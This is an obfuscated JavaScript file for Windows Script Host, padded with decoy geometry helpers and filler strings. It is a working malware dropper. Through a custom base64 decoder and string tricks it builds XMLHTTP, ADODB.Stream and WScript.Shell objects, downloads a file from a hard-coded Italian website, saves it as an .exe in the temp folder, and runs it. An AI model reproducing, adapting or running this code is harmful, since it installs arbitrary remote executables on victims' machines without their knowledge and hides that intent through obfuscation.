
var concerned = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  abate = [];
	
var blackberry = { ':': '.','U': 'S','381': 'X'};
	var wally = 0;


function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function quest(cents) {
	happened = cents;
	for (var i in blackberry){happened = happened.replace(i, blackberry[i]);}
    return happened;
};

var gender = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.quest4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.replace(/acdbentity/g, '')
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = concerned[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = concerned[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = concerned[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = concerned[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var viscera ="acdbentityJVacdbentityRFTVacdbentityAl".quest4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var ovation = "acdbentityQWacdbentityN0aXZacdbentitylWE9iaacdbentitymVjdA=acdbentity=".quest4();
String.prototype.quest2 = function () {
    var bugbear = {
        lyrical: this
    };
    bugbear.regrettable = bugbear.lyrical["c3Vic3RyaW5n".quest4()](wally, gender);
    return bugbear.regrettable;
};

var exemplary ="acdbentityRXhwYW5acdbentitykRW52aXacdbentityJvbm1lbnRTdHJacdbentitypbmdz".quest4();
var Native = function(options){
	
};
var lawlessness = [ovation, exemplary,viscera,  ""+"."+("sisters","yields","speaking","valued","memphis","harder","seeker","locked","exe"), "UnVu".quest4(), quest("M"+"SX"+"ML"+("caracalla","inopportune","wakes","defraud","romantic","exaggerate","romeo","2.")+"381M"+"LH"+"TT"+("tariff","scored","elucidate","scold","stealth","wallace","fatality","devoted","P>")+"WU"+("safeconduct","askew","displace","insurgent","boding","contraction","latticed","cr")+("complexity","seneca","genre","square","start","compensating","dejected","fossil","ip")+"t:"+("insular","hatter","unaided","vendors","lovemaking","visited","guiana","lagoon","Sh")+"ell")];
luminary = "_F2_";
var knoll = this[lawlessness.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
ymPbhGBXxUa = "KiwsenryAI";
cinnamon = (("buckler", "syracuse", "reservations", "selling", "confluence", "tankard", "brake", "pdXvzNI") + "eCsDDiDdM").quest2();
incongruity = (("powered", "beads", "wanting", "korea", "refrigerator", "assignment", "reproductive", "cubit", "separated", "sSHYvmjVqW") + "vAzYvP").quest2();
  
    String.prototype.capitol = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var selfdefense = lawlessness.pop().split(">");

oneness = "b3Blbg==".quest4();
var gripping = new knoll(selfdefense[1]);
var purging = new knoll(selfdefense[0]);
var collusion = gripping[lawlessness.shift()](lawlessness.shift());
weasel = "E";

var oldtime = lawlessness.shift();
var assurance = lawlessness.shift();
function ledger(prometheus, dowry) {

    try {
        var fixes = collusion + "/" + dowry ;
		fixes = fixes+ oldtime;
            purging[oneness](("google","contralto","dunce","fragile","elongated","burrows","nassau","crevice","G" + weasel) + ("sublime","mandatory","janet","participant","corps","nettle","prerequisite","nonchalant","assumes","nether","T"), prometheus, false);
       
    purging[incongruity + ("selfreliant","interest","end")]();
	var abdication=("cinnamon" + WScript=="cinnamon" + "V2luZG93cyBTY3JpcHQgSG9zdA==".quest4())&&purging["c3RhdHVz".quest4()] +""=="MjAw".quest4()&&typeof(LdLhNp)==="undefined";

    if (abdication) {
		
        var energy = new knoll((("election","hundredweight","jewish","generator","staggers","illiterate","possible","retaliate","A")+("paperback","permissions","score","solving","mistrust","showman","frigid","wield","SEOO")+"DB"+("fortyone","workout","communism","sampling","birthright","breeder","tuscany",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        energy[oneness]();
        PwugEoObAQE = "_F9_";
        energy.type = gender;
        IKQNziPGfDd = "_F10_";
        energy["d3JpdGU=".quest4()](purging[("devising","homicide","sumatra","ninetysix","terminal","dearth","milieu","")+"R"+"es"+"pon"+blackberry['U'].toLowerCase()+"e"+"Qm9keQ==".quest4()]);
        iNcQYbsf = "_F11_";
        energy[(cinnamon + "o"+("intestine","broken","unprovoked","daddy","inimical","cherry","committee","transit","00")+("treble","concluded","drawn","genitive","petrograd","employer","overflow","8i")+"tion").replace("0"+("learn","inadvertently","complaint","potatoes","soviet","reciprocal","intervals","08"), incongruity)] = 0;
        cEONOLHm = "_F12_";
        energy.saveToFile(fixes, 2);
        YHtCguUp = "_F13_";
        energy.close();
        XWHQmtb = "_F14_";
		gripping[assurance](fixes, gender, true);
    }
} catch (PmWczxzzGfb) { };

    JviuKD = "_F15_";
}
try{
ledger("aHRacdbentity0cDacdbentityovLw=acdbentity=".quest4()+"\u0077\u0077\u0077"+"\u002E\u0073\u0074\u0075\u0064\u0069\u006F\u0070\u0061\u006E\u0065\u006C\u006C\u0061\u002E\u0069\u0074\u002F\u0037\u0038\u0074\u0067\u0037\u0036\u0038\u0062" + "?YFHGVJNt=JksuLQ","vorzjTcyoSo");}catch(COnfHYcri){}

   brKesPvMG = "_F16_";
   